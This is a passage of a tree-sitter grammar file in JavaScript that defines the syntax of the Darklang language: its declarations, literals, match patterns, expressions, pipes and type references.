// TODOs:
// - deal with keywords
// - better support for partially-written code (i.e. `let x =`)
// - consider using Supertype Nodes for rules whose definitions are a simple choice eg. `simple_expression`, `consts`, etc.

const PREC = {
  LOGICAL_OR: 0,
  LOGICAL_AND: 1,
  COMPARISON: 2,
  SUM: 3,
  PRODUCT: 4,
  EXPONENT: 5,
  FIELDACCESS: 6,
  VAR_IDENTIFIER: 7,
  FN_IDENTIFIER: 8,
  PIPE_EXPR: 9,
  LAMBDA: 10,
  STATEMENT: 11,
};

const logicalOperators = choice("&&", "||");
const comparisonOperators = choice("==", "!=", "<", "<=", ">", ">=");
const additiveOperators = choice("+", "-");
const multiplicativeOperators = choice("*", "/", "%");
const exponentOperator = "^";
const stringConcatOperator = "++";

module.exports = grammar({
  name: "darklang",

  externals: $ => [$.indent, $.dedent, $._function_boundary],
  extras: $ => [/\s/, $._inline_comment],

  conflicts: $ => [[$.module_identifier, $.type_identifier]],

  rules: {
    source_file: $ =>
      seq(
        // all type and fn and constant defs first
        repeat(choice($.module_decl, $.type_decl, $.fn_decl, $.const_decl)),

        // then the expressions to evaluate, in order
        optional($.expression),
      ),

    _inline_comment: _ => token(seq("//", /.*/)),

    type_params: $ =>
      seq(
        field("symbol_open_angle", alias(token.immediate("<"), $.symbol)),
        field("params", $.type_params_items),
        field("symbol_close_angle", alias(token.immediate(">"), $.symbol)),
      ),
    type_params_items: $ =>
      seq(
        $.variable_type_reference,
        repeat(
          seq(
            field("symbol_comma", alias(",", $.symbol)),
            $.variable_type_reference,
          ),
        ),
      ),

    // ---------------------
    // Module declarations
    // ---------------------
    module_decl: $ =>
      prec.left(
        seq(
          field("keyword_module", alias("module", $.keyword)),
          field("name", $.module_identifier),
          field("symbol_equals", alias("=", $.symbol)),
          seq($.indent, field("content", repeat1($.module_content)), $.dedent),
        ),
      ),
    module_content: $ =>
      seq(
        choice(
          $.module_decl,
          $.fn_decl,
          $.type_decl,
          $.const_decl,
          $.expression,
        ),
      ),

    // ---------------------
    // Constant declarations
    // ---------------------
    const_decl: $ =>
      seq(
        field("keyword_const", alias("const", $.keyword)),
        field("name", $.constant_identifier),
        field("symbol_equals", alias("=", $.symbol)),
        field("value", $.consts),
      ),

    consts: $ =>
      choice(
        $.int8_literal,
        $.uint8_literal,
        $.int16_literal,
        $.uint16_literal,
        $.int32_literal,
        $.uint32_literal,
        $.int64_literal,
        $.uint64_literal,
        $.int128_literal,
        $.uint128_literal,
        $.float_literal,
        $.bool_literal,
        $.string_literal,
        $.char_literal,
        $.const_list_literal,
        $.const_tuple_literal,
        $.const_dict_literal,
        $.const_enum_literal,
        $.unit,
        // TODO: should we allow a const_identifier here?
      ),

    const_list_literal: $ => list_literal_base($, $.const_list_content),
    const_list_content: $ => list_content_base($, $.consts),

    const_tuple_literal: $ =>
      tuple_literal_base($, $.consts, $.const_tuple_literal_the_rest),
    const_tuple_literal_the_rest: $ => tuple_literal_the_rest_base($, $.consts),

    const_dict_literal: $ => dict_literal_base($, $.const_dict_content),
    const_dict_content: $ => dict_content_base($, $.const_dict_pair),
    const_dict_pair: $ => dict_pair_base($, $.consts),

    const_enum_literal: $ => enum_literal_base($, $.const_enum_fields),
    const_enum_fields: $ => enum_fields_base($, $.consts),

    // ---------------------
    // Function declarations
    // ---------------------
    fn_decl: $ =>
      seq(
        field("keyword_let", alias("let", $.keyword)),
        field("name", $.fn_identifier),
        optional(field("type_params", $.type_params)),
        field("params", $.fn_decl_params),
        field("symbol_colon", alias(":", $.symbol)),
        field("return_type", $.type_reference),
        field("symbol_equals", alias("=", $.symbol)),
        choice(
          seq($.indent, field("body", $.expression), $.dedent),
          seq(field("body", $.expression), optional($.newline)),
        ),
      ),
    fn_decl_params: $ => repeat1(choice($.unit, $.fn_decl_param)),
    fn_decl_param: $ =>
      seq(
        field("symbol_left_paren", alias("(", $.symbol)),
        field("identifier", $.variable_identifier),
        field("symbol_colon", alias(":", $.symbol)),
        field("typ", $.type_reference),
        field("symbol_right_paren", alias(")", $.symbol)),
      ),

    // ---------------------
    // Type declarations
    // ---------------------
    type_decl: $ =>
      seq(
        field("keyword_type", alias("type", $.keyword)),
        field("name", $.type_identifier),
        optional(field("type_params", $.type_params)),
        field("symbol_equals", alias("=", $.symbol)),
        field("typ", $.type_decl_def),
      ),

    // Definition
    type_decl_def: $ =>
      choice(
        $.type_decl_def_alias,
        $.type_decl_def_record,
        $.type_decl_def_enum,
      ),

    //
    // Alias
    type_decl_def_alias: $ => $.type_reference,

    //
    // Record
    // e.g. `type Person = { name: String; age: Int }`
    type_decl_def_record: $ =>
      // CLEANUP consider supporting a mixed mode of these choices:
      // ```
      // type MyRecord =
      //   { a: Bool; b: Bool
      //     c: Bool }
      // ```
      // F#, for example, allows this
      choice(
        seq(
          field("symbol_open_brace", alias("{", $.symbol)),
          optional(field("fields", $.type_decl_def_record_fields)),
          field("symbol_close_brace", alias("}", $.symbol)),
        ),
        seq(
          $.indent,
          field("symbol_open_brace", alias("{", $.symbol)),
          optional(field("fields", $.type_decl_def_record_fields)),
          field("symbol_close_brace", alias("}", $.symbol)),
          $.dedent,
        ),
      ),

    type_decl_def_record_fields: $ =>
      choice(
        seq(
          field("first", $.type_decl_def_record_field),
          field(
            "others",
            repeat(
              seq(
                field("symbol_semicolon", alias(";", $.symbol)),
                $.type_decl_def_record_field,
              ),
            ),
          ),
        ),
        seq(
          field("first", $.type_decl_def_record_field),
          field("others", repeat(seq($.newline, $.type_decl_def_record_field))),
          optional($.newline),
        ),
      ),

    type_decl_def_record_field: $ =>
      seq(
        field("field_name", $.variable_identifier),
        field("symbol_colon", alias(":", $.symbol)),
        field("type", $.type_reference),
      ),

    //
    // Enums
    // e.g. `type Color = Red | Green | Blue`
    // TODO: don't require the | for the first enum field in a single line enum
    type_decl_def_enum: $ =>
      field(
        "content",
        choice($.type_decl_enum_single_line, $.type_decl_enum_multi_line),
      ),
    type_decl_enum_single_line: $ => repeat1($.type_decl_enum_case),
    type_decl_enum_multi_line: $ =>
      seq($.indent, repeat1($.type_decl_enum_case), $.dedent),
    type_decl_enum_case: $ =>
      seq(
        field("symbol_pipe", alias("|", $.symbol)),
        field("case_name", $.enum_case_identifier),
        optional(
          seq(
            field("keyword_of", alias("of", $.keyword)),
            seq(
              $.type_decl_enum_field,
              repeat(
                seq(
                  field("symbol_astrisk", alias("*", $.symbol)),
                  $.type_decl_enum_field,
                ),
              ),
            ),
          ),
        ),
      ),

    type_decl_enum_field: $ =>
      seq(
        optional(
          field(
            "type_annotation",
            seq(
              field("identifier", $.variable_identifier),
              field("symbol_colon", alias(":", $.symbol)),
            ),
          ),
        ),
        field("type", $.type_reference),
      ),

    // ---------------------
    // Match patterns
    // ---------------------
    match_pattern: $ =>
      choice(
        $.unit,
        alias($.bool_literal, $.bool),
        alias($.int8_literal, $.int8),
        alias($.uint8_literal, $.uint8),
        alias($.int16_literal, $.int16),
        alias($.uint16_literal, $.uint16),
        alias($.int32_literal, $.int32),
        alias($.uint32_literal, $.uint32),
        alias($.int64_literal, $.int64),
        alias($.uint64_literal, $.uint64),
        alias($.int128_literal, $.int128),
        alias($.uint128_literal, $.uint128),
        alias($.float_literal, $.float),
        alias($.char_literal, $.char),
        alias($.string_literal, $.string),
        alias($.mp_list, $.list),
        alias($.mp_list_cons, $.list_cons),
        alias($.mp_tuple, $.tuple),
        alias($.mp_enum, $.enum),
        alias($.variable_identifier, $.variable),
        $.mp_or,
      ),

    //
    // match pattern - list
    mp_list: $ => list_literal_base($, $.mp_list_content),
    mp_list_content: $ => list_content_base($, $.match_pattern),

    //
    // match pattern - list cons
    mp_list_cons: $ =>
      prec.right(
        choice(
          seq(
            field("head", $.match_pattern),
            field("symbol_double_colon", alias("::", $.symbol)),
            field("tail", $.match_pattern),
          ),

          seq(
            field("symbol_open_paren", alias("(", $.symbol)),
            field("head", $.match_pattern),
            field("symbol_double_colon", alias("::", $.symbol)),
            field("tail", $.match_pattern),
            field("symbol_close_paren", alias(")", $.symbol)),
          ),
        ),
      ),

    //
    // match pattern - tuple
    mp_tuple: $ => tuple_literal_base($, $.match_pattern, $.mp_tuple_the_rest),
    mp_tuple_the_rest: $ => tuple_literal_the_rest_base($, $.match_pattern),

    //
    // match pattern - enum
    mp_enum: $ =>
      prec.right(
        seq(
          field("case_name", $.enum_case_identifier),
          optional(
            choice(
              seq(
                field(
                  "symbol_open_paren",
                  alias(token.immediate("("), $.symbol),
                ),
                field("enum_fields", $.mp_enum_fields),
                field("symbol_close_paren", alias(")", $.symbol)),
              ),
              field("enum_fields", $.mp_enum_fields),
            ),
          ),
        ),
      ),

    mp_enum_fields: $ => enum_fields_base($, $.match_pattern),

    mp_or: $ =>
      prec.left(
        field(
          "patterns",
          seq(
            field("pattern", $.match_pattern),

            repeat1(
              prec.left(
                seq(
                  field("symbol_pipe", alias("|", $.symbol)),
                  field("pattern", $.match_pattern),
                ),
              ),
            ),
          ),
        ),
      ),

    // ---------------------
    // Expressions
    // ---------------------

    /**
     * `simple_expression` vs. `expression`:
     *
     * `simple_expression`:
     * includes simple elements that have distinct starting and ending points, typically not requiring parentheses for clarity.
     * e.g. literals, variables, etc.
     *
     * `expression`:
     * Enompasses both simple expressions and more complex expressions (e.g. infix operations, function calls, etc.).
     * These are elements that may require parentheses to disambiguate the order and grouping of elements.
     *
     * e.g.
     * `myFunction myFunction2 arg arg2`
     *
     * without parentheses, It's unclear whether `arg2` is supposed to be a second argument to `myFunction2`:
     * myFunction (myFunction2 arg arg2)
     *
     * or a second argument to `myFunction`:
     * myFunction (myFunction2 arg) (arg2)
     *
     */

    // TODO: reconsider having enum_literal as a simple_expression
    simple_expression: $ =>
      choice(
        $.unit,
        $.bool_literal,
        $.int8_literal,
        $.uint8_literal,
        $.int16_literal,
        $.uint16_literal,
        $.int32_literal,
        $.uint32_literal,
        $.int64_literal,
        $.uint64_literal,
        $.int128_literal,
        $.uint128_literal,
        $.float_literal,
        $.string_segment,
        $.char_literal,
        $.list_literal,
        $.dict_literal,
        $.record_literal,
        $.enum_literal,
        $.variable_identifier,
        $.field_access,
        $.tuple_literal,
        $.record_update,
        $.qualified_const_or_fn_name,
        $.dbReference,
        $.infix_operation,
        $.paren_expression,
      ),

    expression: $ =>
      choice(
        $.simple_expression,

        $.if_expression,
        $.let_expression,

        $.match_expression,

        $.apply,

        $.lambda_expression,
        $.pipe_expression,
        $.statement,
      ),

    paren_expression: $ =>
      seq(
        field("symbol_left_paren", alias("(", $.symbol)),
        field("expr", $.expression),
        field("symbol_right_paren", alias(")", $.symbol)),
      ),

    statement: $ =>
      prec.left(
        PREC.STATEMENT,
        seq(field("first", $.expression), field("next", $.expression)),
      ),

    //
    // Booleans
    bool_literal: $ => choice(/true/, /false/),

    //
    // Integers
    //CLEANUP: we are using .NET suffixes for integers (e.g. `1L` for Int64) temporarily until we remove the old parser.

    digits: $ => choice($.positive_digits, $.negative_digits),
    negative_digits: $ => /-\d+/,
    positive_digits: $ => /\d+/,

    int8_literal: $ =>
      seq(field("digits", $.digits), field("suffix", alias("y", $.symbol))),

    uint8_literal: $ =>
      seq(
        field("digits", $.positive_digits),
        field("suffix", alias("uy", $.symbol)),
      ),

    int16_literal: $ =>
      seq(field("digits", $.digits), field("suffix", alias("s", $.symbol))),

    uint16_literal: $ =>
      seq(
        field("digits", $.positive_digits),
        field("suffix", alias("us", $.symbol)),
      ),

    int32_literal: $ =>
      seq(field("digits", $.digits), field("suffix", alias("l", $.symbol))),

    uint32_literal: $ =>
      seq(
        field("digits", $.positive_digits),
        field("suffix", alias("ul", $.symbol)),
      ),

    int64_literal: $ =>
      seq(field("digits", $.digits), field("suffix", alias("L", $.symbol))),

    uint64_literal: $ =>
      seq(
        field("digits", $.positive_digits),
        field("suffix", alias("UL", $.symbol)),
      ),

    int128_literal: $ =>
      seq(field("digits", $.digits), field("suffix", alias("Q", $.symbol))),

    uint128_literal: $ =>
      seq(
        field("digits", $.positive_digits),
        field("suffix", alias("Z", $.symbol)),
      ),

    //
    // Floats
    float_literal: $ => /[+-]?[0-9]+\.[0-9]+/,

    //
    // Characters
    char_or_string_escape_sequence: _ =>
      token.immediate(
        choice(
          seq("\\", /(\"|\'|\\|\/|a|b|f|n|r|t|v)/),
          seq("\\", "x", /[0-9a-fA-F]{2}/),
          seq("\\", "X", /[0-9a-fA-F]{4}/),
          seq("\\", "u", /[0-9a-fA-F]{4}/),
          seq("\\", "U", /[0-9a-fA-F]{8}/),
        ),
      ),

    char_literal: $ =>
      seq(
        field("symbol_open_single_quote", alias("'", $.symbol)),
        field("content", $.character),
        field("symbol_close_single_quote", alias("'", $.symbol)),
      ),
    character: $ =>
      choice(
        // higher precedence than escape sequences
        token.immediate("'"),
        token.immediate(prec(1, /[^'\\\n]/)),
        $.char_or_string_escape_sequence,
      ),

    //
    // Strings
    string_literal: $ =>
      choice(
        seq(
          field("symbol_open_quote", alias('"', $.symbol)),
          optional(field("content", $.string_content)),
          field("symbol_close_quote", alias('"', $.symbol)),
        ),
        // multiline strings
        seq(
          field("symbol_open_quote", alias('"""', $.symbol)),
          optional(field("content", $.multiline_string_content)),
          field("symbol_close_quote", alias('"""', $.symbol)),
        ),
      ),

    string_content: $ =>
      repeat1(
        choice(
          // higher precedence than escape sequences
          token.immediate(prec(1, /[^\\"\n]+/)),
          $.char_or_string_escape_sequence,
        ),
      ),

    multiline_string_content: $ =>
      repeat1(
        choice(
          // match any character that isn't a  backslash or a double quote
          token.immediate(/[^\\"]/),
          // match a single double quote
          token.immediate(/"/),
          $.char_or_string_escape_sequence,
        ),
      ),

    // $"hello {name}
    string_interpolation: $ =>
      choice(
        seq(
          field("symbol_dollar_sign", alias("$", $.symbol)),
          field("symbol_open_quote", alias('"', $.symbol)),
          optional(
            field(
              "string_interpolation_content",
              $.string_interpolation_content,
            ),
          ),
          field("symbol_close_quote", alias('"', $.symbol)),
        ),
        // multiline strings
        seq(
          field("symbol_dollar_sign", alias("$", $.symbol)),
          field("symbol_open_quote", alias('"""', $.symbol)),
          optional(
            field(
              "string_interpolation_content",
              $.string_interpolation_content,
            ),
          ),
          field("symbol_close_quote", alias('"""', $.symbol)),
        ),
      ),

    string_interpolation_content: $ =>
      repeat1(
        choice(
          $.string_to_eval,
          $.string_text,
          $.char_or_string_escape_sequence,
        ),
      ),

    string_text: $ => token.immediate(prec.left(/[^{}\\"]+/)),

    string_to_eval: $ =>
      seq(
        field("symbol_open_brace", alias("{", $.symbol)),
        field("expr", $.expression),
        field("symbol_close_brace", alias("}", $.symbol)),
      ),

    string_segment: $ => choice($.string_literal, $.string_interpolation),

    //
    // List
    list_literal: $ => list_literal_base($, $.list_content),
    list_content: $ => list_content_base($, $.expression),

    //
    // Dict
    dict_literal: $ => dict_literal_base($, $.dict_content),
    dict_content: $ => dict_content_base($, $.dict_pair),
    dict_pair: $ => dict_pair_base($, $.expression),

    //
    // Tuples
    tuple_literal: $ =>
      tuple_literal_base($, $.expression, $.tuple_literal_the_rest),
    tuple_literal_the_rest: $ => tuple_literal_the_rest_base($, $.expression),

    //
    // Record
    record_literal: $ =>
      prec.right(
        choice(
          seq(
            field("type_name", $.qualified_type_name),
            field("symbol_open_brace", alias("{", $.symbol)),
            optional(field("content", $.record_content)),
            field("symbol_close_brace", alias("}", $.symbol)),
          ),
          seq(
            field("type_name", $.qualified_type_name),
            $.indent,
            field("symbol_open_brace", alias("{", $.symbol)),
            optional(field("content", $.record_content)),
            field("symbol_close_brace", alias("}", $.symbol)),
            $.dedent,
          ),
          seq(
            field("type_name", $.qualified_type_name),
            field("symbol_open_brace", alias("{", $.symbol)),
            $.indent,
            optional(field("content", $.record_content)),
            field("symbol_close_brace", alias("}", $.symbol)),
            $.dedent,
          ),
        ),
      ),
    record_content: $ =>
      choice(
        seq(
          $.record_pair,
          repeat(
            seq(field("record_separator", alias(";", $.symbol)), $.record_pair),
          ),
        ),
        seq(
          $.record_pair,
          repeat(seq($.newline, $.record_pair)),
          optional($.newline),
        ),
      ),
    record_pair: $ =>
      seq(
        field("field", $.variable_identifier),
        field("symbol_equals", alias("=", $.symbol)),
        choice(
          field("value", $.expression),
          seq($.indent, field("value", $.expression), $.dedent),
        ),
      ),

    //
    // Record update
    // e.g. { RecordForUpdate { x = 4L; y = 1L } with y = 2L }
    record_update: $ =>
      seq(
        field("symbol_open_brace", alias("{", $.symbol)),
        field("record", $.expression),
        field("keyword_with", alias("with", $.keyword)),
        field("field_updates", $.record_update_fields),
        field("symbol_close_brace", alias("}", $.symbol)),
      ),
    record_update_fields: $ =>
      choice(
        seq(
          $.record_update_field,
          repeat(
            seq(
              field("symbol_semicolon", alias(";", $.symbol)),
              $.record_update_field,
            ),
          ),
        ),
        seq(
          $.indent,
          $.record_update_field,
          repeat(seq(repeat($.newline), $.record_update_field)),
          optional($.dedent),
        ),
      ),

    record_update_field: $ =>
      seq(
        field("field_name", $.variable_identifier),
        field("symbol_equals", alias("=", $.symbol)),
        choice(
          seq($.indent, field("value", $.expression), $.dedent),

          field("value", $.expression),
        ),
      ),

    //
    // Enum
    enum_literal: $ => enum_literal_base($, $.enum_fields),
    enum_fields: $ => enum_fields_base($, $.expression),

    //
    // Infix operations
    infix_operation: $ =>
      // given `1 + 2 * 3`, this will parse as `1 + (2 * 3)`
      choice(
        // Power
        prec.right(
          PREC.EXPONENT,
          seq(
            field("left", $.simple_expression),
            field("operator", alias(exponentOperator, $.operator)),
            field("right", $.simple_expression),
          ),
        ),

        // multiplication, division, modulo
        prec.left(
          PREC.PRODUCT,
          seq(
            field("left", $.simple_expression),
            field("operator", alias(multiplicativeOperators, $.operator)),
            field("right", $.simple_expression),
          ),
        ),

        // addition, subtraction
        prec.left(
          PREC.SUM,
          seq(
            field("left", $.simple_expression),
            field("operator", alias(additiveOperators, $.operator)),
            field("right", $.simple_expression),
          ),
        ),

        // Comparison
        prec.left(
          PREC.COMPARISON,
          seq(
            field("left", $.simple_expression),
            field("operator", alias(comparisonOperators, $.operator)),
            field("right", $.simple_expression),
          ),
        ),

        // Logical operations
        prec.left(
          PREC.LOGICAL_AND,
          seq(
            field("left", $.simple_expression),
            field("operator", alias(logicalOperators, $.operator)),
            field("right", $.simple_expression),
          ),
        ),
        prec.left(
          PREC.LOGICAL_OR,
          seq(
            field("left", $.simple_expression),
            field("operator", alias(logicalOperators, $.operator)),
            field("right", $.simple_expression),
          ),
        ),

        // String concatenation
        prec.left(
          PREC.SUM,
          seq(
            field("left", $.simple_expression),
            field("operator", alias(stringConcatOperator, $.operator)),
            field("right", $.simple_expression),
          ),
        ),
      ),

    //
    // If expressions
    if_expression: $ =>
      prec.right(
        seq(
          field("keyword_if", alias("if", $.keyword)),
          field("condition", $.expression),
          field("keyword_then", alias("then", $.keyword)),
          choice(
            seq(
              $.indent,
              repeat1(field("then_expression", $.expression)),
              $.dedent,
            ),
            field("then_expression", $.expression),
          ),
          optional(
            seq(
              field("keyword_else", alias("else", $.keyword)),
              choice(
                seq(
                  $.indent,
                  repeat(field("else_expression", $.expression)),
                  $.dedent,
                ),
                field("else_expression", $.expression),
              ),
            ),
          ),
        ),
      ),

    // field access
    // e.g. `person.name`
    field_access: $ =>
      prec(
        PREC.FIELDACCESS,
        seq(
          field(
            "expr",
            choice(
              $.variable_identifier,
              $.record_literal,
              $.paren_expression,
              $.field_access,
            ),
          ),
          field("symbol_dot", alias(".", $.symbol)),
          field("field_name", $.variable_identifier),
        ),
      ),

    //
    // DB reference
    dbReference: $ => $.type_identifier,

    //
    // Qualified constant or function name
    qualified_const_or_fn_name: $ =>
      seq(
        repeat(seq($.module_identifier, alias(".", $.symbol))),
        $.constant_or_fn_identifier,
      ),

    //
    // Lambda expressions
    lambda_expression: $ =>
      prec(
        PREC.LAMBDA,
        seq(
          field("keyword_fun", alias("fun", $.keyword)),
          field("pats", $.lambda_pats),
          field("symbol_arrow", alias("->", $.symbol)),
          field(
            "body",
            choice($.expression, seq($.indent, $.expression, $.dedent)),
          ),
        ),
      ),
    lambda_pats: $ => field("pat", repeat1($.let_pattern)),

    lp_tuple: $ => tuple_literal_base($, $.let_pattern, $.let_pattern_the_rest),
    let_pattern_the_rest: $ => tuple_literal_the_rest_base($, $.let_pattern),
    //CLEANUP: add support for lp_parens (just a let_pattern wrapped in parens)
    let_pattern: $ => choice($.unit, $.lp_tuple, $.variable_identifier),

    //
    // Let expression
    let_expression: $ =>
      seq(
        field("keyword_let", alias("let", $.keyword)),
        field("pattern", $.let_pattern),
        field("symbol_equals", alias("=", $.symbol)),
        choice(
          seq(field("expr", $.expression), "\n"),
          seq($.indent, field("expr", $.expression), $.dedent, optional("\n")),
        ),
        field("body", $.expression),
      ),

    //
    // Match expression
    // TODO : allow one-line match expressions (i.e. match x with | 1 -> ...)
    match_expression: $ =>
      seq(
        field("keyword_match", alias("match", $.keyword)),
        field("arg", $.expression),
        field("keyword_with", alias("with", $.keyword)),
        field("cases", prec.left(repeat1($.match_case))),
      ),
    match_case: $ =>
      seq(
        field("symbol_pipe", alias("|", $.symbol)),
        field("pattern", $.match_pattern),
        optional(
          seq(
            field("when_keyword", alias("when", $.keyword)),
            field("guard_expr", $.expression),
          ),
        ),
        field("symbol_arrow", alias("->", $.symbol)),
        choice(
          seq($.indent, field("rhs", $.expression), $.dedent),
          field("rhs", $.expression),
        ),
      ),

    //
    // Function call
    // e.g. `Int64.add 1 2
    apply: $ =>
      prec.right(
        seq(
          // TODO: fn should be an expression
          field("fn", $.qualified_fn_name),
          choice(
            seq(
              field("args", repeat1($.simple_expression)),
              optional($._function_boundary),
            ),
            seq(
              $.indent,
              field("args", seq($.expression, repeat(seq(/\n/, $.expression)))),
              $.dedent,
            ),
          ),
        ),
      ),

    // ---------------------
    // Pipe expressions
    // ---------------------

    //
    // Pipe lambda
    pipe_lambda: $ =>
      choice(
        field("pipe_lambda", $.lambda_expression),
        seq(
          field("symbol_open_paren", alias("(", $.symbol)),
          field("pipe_lambda", $.lambda_expression),
          field("symbol_close_paren", alias(")", $.symbol)),
        ),
      ),

    //
    // Pipe infix
    operator: $ =>
      choice(
        exponentOperator,
        multiplicativeOperators,
        additiveOperators,
        comparisonOperators,
        logicalOperators,
        stringConcatOperator,
      ),

    pipe_infix: $ =>
      prec.right(
        50, // this precedence is important to ensure it will parse `1L |> (-) 2L |> (+) 3L` as ((1L |> (-) 2L) |> (+) 3L) and not `(1L |> ((-) 2L |> (+) 3L))`
        seq(
          field("symbol_open_paren", alias("(", $.symbol)),
          field("operator", $.operator),
          field("symbol_close_paren", alias(")", $.symbol)),
          field("right", $.expression),
        ),
      ),

    //
    // Pipe function call
    pipe_fn_call: $ =>
      prec.right(
        seq(
          field("fn", $.qualified_fn_name),
          field("args", repeat($.simple_expression)),
          optional($._function_boundary),
        ),
      ),

    //
    // Pipe enum
    pipe_enum: $ => enum_literal_base($, $.pipe_enum_fields),
    pipe_enum_fields: $ => enum_fields_base($, $.expression),

    pipe_expr: $ =>
      choice($.pipe_lambda, $.pipe_infix, $.pipe_fn_call, $.pipe_enum),

    pipe_exprs: $ =>
      prec.left(
        seq(
          field("symbol_pipe", alias("|>", $.symbol)),
          field("pipe_expr", $.pipe_expr),
        ),
      ),

    pipe_expression: $ =>
      prec.left(
        PREC.PIPE_EXPR,
        seq(
          field("expr", $.expression),
          repeat1(field("pipe_exprs", $.pipe_exprs)),
        ),
      ),

    // ---------------------
    // Common
    // ---------------------
    type_reference: $ => choice($.builtin_type, $.qualified_type_name),

    builtin_type: $ =>
      choice(
        /Unit/,
        /Bool/,
        /Int8/,
        /UInt8/,
        /Int16/,
        /UInt16/,
        /Int32/,
        /UInt32/,
        /Int64/,
        /UInt64/,
        /Int128/,
        /UInt128/,
        /Float/,
        /Char/,
        /String/,
        /DateTime/,
        /Uuid/,
        $.list_type_reference,
        $.tuple_type_reference,
        $.dict_type_reference,
        $.fn_type_reference,
        $.variable_type_reference,

        $.db_type_reference,
      ),

    //
    // List<T>
    list_type_reference: $ =>
      seq(
        field("keyword_type_constructor", alias("List", $.keyword)),
        field("symbol_open_angle", alias("<", $.symbol)),
        field("typ_param", $.type_reference),
        field("symbol_close_angle", alias(">", $.symbol)),
      ),

    //
    // Tuple
    tuple_type_reference: $ =>
      // CLEANUP: make the parens optional
      seq(
        field("symbol_left_paren", alias("(", $.symbol)),
        field("first", $.type_reference),
        field("symbol_asterisk", alias("*", $.symbol)),
        field("second", $.type_reference),
        optional(field("rest", $.type_reference_tuple_the_rest)),
        field("symbol_right_paren", alias(")", $.symbol)),
      ),
    type_reference_tuple_the_rest: $ =>
      repeat1(
        seq(
          field("symbol_asterisk", alias("*", $.symbol)),
          field("type", $.type_reference),
        ),
      ),

    //
    // Dict<T>
    dict_type_reference: $ =>
      seq(
        field("keyword_type_constructor", alias("Dict", $.keyword)),
        field("symbol_open_angle", alias("<", $.symbol)),
        field("value_type", $.type_reference),
        field("symbol_close_angle", alias(">", $.symbol)),
      ),

    //
    // Function type reference
    //  'a -> 'b -> 'c
    fn_type_reference: $ =>
      choice(
        seq(
          field("symbol_left_paren", alias("(", $.symbol)),
          $._function_type_sequence,
          field("symbol_right_paren", alias(")", $.symbol)),
        ),
        $._function_type_sequence,
      ),

    _function_type_sequence: $ =>
      prec.right(
        2,
        seq(
          repeat1(
            prec.left(
              1,
              seq(
                $.type_reference,
                field("symbol_arrow", alias("->", $.symbol)),
              ),
            ),
          ),
          $.type_reference,
        ),
      ),

    //
    // DB type reference
    // DB<'a>
    db_type_reference: $ =>
      seq(
        field("keyword_type_constructor", alias("DB", $.keyword)),
        field("symbol_open_angle", alias("<", $.symbol)),
        field("typ_param", $.type_reference),
        field("symbol_close_angle", alias(">", $.symbol)),
      ),

    //
    // Variable type reference
    // 'a
    variable_type_reference: $ =>
      seq(
        field("symbol_single_quote", alias("'", $.symbol)),
        field("variable", $.variable_identifier),
      ),

    // ---------------------
    // Identifiers
    // ---------------------
    qualified_fn_name: $ =>
      seq(
        seq(
          repeat(seq($.module_identifier, alias(".", $.symbol))),
          $.fn_identifier,
        ),
        optional(field("type_args", $.type_args)),
      ),

    qualified_type_name: $ =>
      prec(
        1,
        seq(
          seq(
            repeat(seq($.module_identifier, alias(".", $.symbol))),
            field("type_identifier", $.type_identifier),
          ),
          optional(field("type_args", $.type_args)),
        ),
      ),

    type_args: $ =>
      seq(
        field("symbol_open_angle", alias(token.immediate("<"), $.symbol)),
        field("type_args_items", $.type_args_items),
        field("symbol_close_angle", alias(token.immediate(">"), $.symbol)),
      ),
    type_args_items: $ =>
      seq(
        $.type_reference,
        repeat(
          seq(field("symbol_comma", alias(",", $.symbol)), $.type_reference),
        ),
      ),

    // e.g. `LanguageTools in `PACKAGE.Darklang.LanguageTools.SomeType`
    module_identifier: $ => /[A-Z][a-zA-Z0-9_]*/,

    // e.g. `Person` in `type MyPerson = ...`
    type_identifier: $ => /[A-Z][a-zA-Z0-9_]*/,

    // e.g. `newline` in `const newline = '\n'`
    constant_identifier: $ => /[a-z_][a-zA-Z0-9_']*/,
    constant_or_fn_identifier: $ => /[a-z_][a-zA-Z0-9_']*/,

    // e.g. `double` in `let double (x: Int) = x + x`
    fn_identifier: $ => prec(PREC.FN_IDENTIFIER, /[a-z_][a-zA-Z0-9_']*/),

    /** e.g. `x` in `let double (x: Int) = x + x`
     *
     * for let bindings, params, etc. */
    variable_identifier: $ => prec(PREC.VAR_IDENTIFIER, /[a-z_][a-zA-Z0-9_']*/),

    // e.g. `Dict { ``Content-Length`` } = "0"`
    double_backtick_identifier: $ => token(seq("``", /[^`]+/, "``")),

    enum_case_identifier: $ => /[A-Z][a-zA-Z0-9_]*/,

    newline: $ => /\n/,

    unit: $ => "()",
  },
});

// ---------------------
// Helper functions
// ---------------------

//
// List
function list_literal_base($, contentRule) {
  return seq(
    field("symbol_open_bracket", alias("[", $.symbol)),
    optional(field("content", contentRule)),
    field("symbol_close_bracket", alias("]", $.symbol)),
  );
}
function list_content_base($, content) {
  return choice(
    seq(
      content,
      repeat(seq(field("list_separator", alias(";", $.symbol)), content)),
      optional(alias(";", $.symbol)),
    ),
    seq(content, repeat(seq($.newline, content)), optional($.newline)),
    seq(
      $.indent,
      seq(content, repeat(seq($.newline, content)), optional($.newline)),
      $.dedent,
    ),
  );
}

//
// Tuple
function tuple_literal_base($, firstOrSecond, rest) {
  return seq(
    field("symbol_left_paren", alias("(", $.symbol)),
    field("first", firstOrSecond),
    field("symbol_comma", alias(",", $.symbol)),
    field("second", firstOrSecond),
    optional(field("rest", rest)),
    field("symbol_right_paren", alias(")", $.symbol)),
  );
}
function tuple_literal_the_rest_base($, rest) {
  return repeat1(
    seq(field("symbol_comma", alias(",", $.symbol)), field("expr", rest)),
  );
}

//
// Dict
function dict_literal_base($, contentRule) {
  return seq(
    field("keyword_dict", alias("Dict", $.keyword)),
    field("symbol_open_brace", alias("{", $.symbol)),
    optional(field("content", contentRule)),
    field("symbol_close_brace", alias("}", $.symbol)),
  );
}
function dict_content_base($, dict_pair) {
  return choice(
    seq(
      dict_pair,
      repeat(seq(field("dict_separator", alias(";", $.symbol)), dict_pair)),
    ),
    seq(dict_pair, repeat(seq($.newline, dict_pair)), optional($.newline)),
  );
}
function dict_pair_base($, value) {
  return seq(
    // CLEANUP this should allow for any string (i.e. `This`), without any backticks. may require alternative syntax.
    field("key", choice($.variable_identifier, $.double_backtick_identifier)),
    field("symbol_equals", alias("=", $.symbol)),
    field("value", value),
  );
}

//
// Enum
function enum_literal_base($, enum_fields) {
  return prec.right(
    seq(
      field("type_name", $.qualified_type_name),
      field("symbol_dot", alias(".", $.symbol)),
      field("case_name", $.enum_case_identifier),
      optional(
        choice(
          seq(
            field("symbol_open_paren", alias(token.immediate("("), $.symbol)),
